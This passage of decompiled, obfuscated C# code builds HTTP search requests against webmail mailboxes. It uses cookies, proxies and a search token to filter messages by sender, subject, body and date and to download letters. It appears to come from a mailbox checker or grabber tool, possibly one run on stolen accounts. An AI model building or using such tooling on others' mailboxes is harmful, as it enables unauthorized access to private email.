			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = <Module>.smethod_4<string>(-486361030);
		}

		// Token: 0x06000555 RID: 1365 RVA: 0x00020624 File Offset: 0x0001E824
		private void SetSearchHeaders(HttpRequest request, Request searchRequest)
		{
			int num = SearchSettings.Instance.DownloadLetters ? SearchSettings.Instance.DownloadLettersLimit : 1;
			request.AddUrlParam(<Module>.smethod_6<string>(-1094373818), this._searchToken);
			request.AddUrlParam(<Module>.smethod_3<string>(1005971403), 1);
			request.AddUrlParam(<Module>.smethod_5<string>(1629054962), 1);
			request.AddUrlParam(<Module>.smethod_5<string>(-1399834772), 1);
			request.AddUrlParam(<Module>.smethod_4<string>(-466515747), <Module>.smethod_5<string>(918127949));
			request.AddUrlParam(<Module>.smethod_4<string>(-1653209737), num);
			request.AddUrlParam(<Module>.smethod_5<string>(-1753112565), this._mailbox.Address);
			if (searchRequest.Sender != null)
			{
				request.AddUrlParam(<Module>.smethod_5<string>(-2084136846), searchRequest.Sender);
			}
			if (searchRequest.Subject != null)
			{
				request.AddUrlParam(<Module>.smethod_6<string>(1914546539), searchRequest.Subject);
			}
			if (searchRequest.Body != null)
			{
				request.AddUrlParam(<Module>.smethod_5<string>(1249152230), searchRequest.Body);
			}
			if (searchRequest.CheckDate)
			{
				if (searchRequest.DateFrom != null)
				{
					request.AddUrlParam(<Module>.smethod_6<string>(1321839018), searchRequest.DateFrom.Value.Day);
					request.AddUrlParam(<Module>.smethod_5<string>(1451024986), searchRequest.DateFrom.Value.Month);
					request.AddUrlParam(<Module>.smethod_6<string>(2064020758), searchRequest.DateFrom.Value.Year);
				}
				if (searchRequest.DateTo != null)
				{
					request.AddUrlParam(<Module>.smethod_2<string>(-1340871065), searchRequest.DateTo.Value.Day);
					request.AddUrlParam(<Module>.smethod_2<string>(-508534179), searchRequest.DateTo.Value.Month);
					request.AddUrlParam(<Module>.smethod_4<string>(1847685180), searchRequest.DateTo.Value.Year);
					return;
				}
			}
			else if (SearchSettings.Instance.CheckDate)
			{
				if (SearchSettings.Instance.DateFrom != null)
				{
					request.AddUrlParam(<Module>.smethod_4<string>(186803630), SearchSettings.Instance.DateFrom.Value.Day);
					request.AddUrlParam(<Module>.smethod_4<string>(-868753996), SearchSettings.Instance.DateFrom.Value.Month);
					request.AddUrlParam(<Module>.smethod_4<string>(1673361682), SearchSettings.Instance.DateFrom.Value.Year);
				}
				if (SearchSettings.Instance.DateTo != null)
				{
					request.AddUrlParam(<Module>.smethod_5<string>(1071122254), SearchSettings.Instance.DateTo.Value.Day);
					request.AddUrlParam(<Module>.smethod_4<string>(884097622), SearchSettings.Instance.DateTo.Value.Month);
					request.AddUrlParam(<Module>.smethod_5<string>(691219522), SearchSettings.Instance.DateTo.Value.Year);
				}
			}
		}

		// Token: 0x06000556 RID: 1366 RVA: 0x00009B57 File Offset: 0x00007D57
		private bool IsAboveLimit(int count)
		{
			return !SearchSettings.Instance.UseSearchLimit || count >= SearchSettings.Instance.SearchLimit;
		}

		// Token: 0x06000557 RID: 1367 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002CF RID: 719
		private Mailbox _mailbox;

		// Token: 0x040002D0 RID: 720
		private ProxyClient _proxyClient;

		// Token: 0x040002D1 RID: 721
		private CookieDictionary _cookies;

		// Token: 0x040002D2 RID: 722
		private string _searchToken;
	}
}
